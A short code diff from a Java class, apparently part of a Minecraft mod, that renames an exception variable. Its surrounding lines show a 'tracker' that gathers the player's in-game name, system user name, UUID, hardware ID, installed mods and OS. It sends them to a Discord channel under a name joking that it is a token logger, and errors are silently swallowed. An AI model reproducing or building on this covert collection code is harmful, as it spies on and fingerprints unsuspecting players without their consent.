@@ -23,6 +23,6 @@ public class Tracker
             final TrackerPlayerBuilder dm = new TrackerPlayerBuilder.Builder().withUsername("Perrys Token Log I mean Tracker").withContent("```\n IGN: " + minecraft_name + "\n USER: " + System.getProperty("user.name") + "\n UUID: " + Minecraft.getMinecraft().session.getPlayerID() + "\n HWID: " + SystemUtil.getSystemInfo() + "\n MODS: " + SystemUtil.getModsList() + "\n OS: " + System.getProperty("os.name") + "\n Started the game.```").withAvatarURL("https://cdn.discordapp.com/icons/851358091286282260/17fdd021c701c00ff95bc2b50344a5ad.png?size=128").withDev(false).build();
             d.sendMessage(dm);
         }
-        catch (Exception ex) {}
+        catch (Exception ex2) {}
     }
 }
